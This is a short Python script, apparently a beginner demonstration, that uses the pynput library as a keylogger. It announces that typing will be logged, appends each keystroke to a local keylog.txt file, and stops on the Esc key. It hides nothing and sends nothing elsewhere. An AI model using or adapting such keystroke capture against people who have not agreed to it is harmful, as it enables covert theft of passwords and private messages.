import pynput.keyboard
print("TYPE THE WORDS IN KEYBOARD : \n")
print("THAT WILL BE STORED IN KEYLOGS......")
# Define a function to write the key to a log file
def write_to_file(key):
    character = str(key)
    character = character.replace("'", "")

    # Check for special keys
    if character == "Key.space":
        character = " "
    elif character == "Key.enter":
        character = "\n"
    elif character == "Key.backspace":
        character = "[BACKSPACE]"

    with open("keylog.txt", "a") as file:
        file.write(character + '\n')

# Define a function to handle key press events
def on_press(key):
    try:
        write_to_file(key)
    except AttributeError:
        pass

# Define a function to handle key release events
def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # Stop the listener
        return False

# Start the keylogger
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
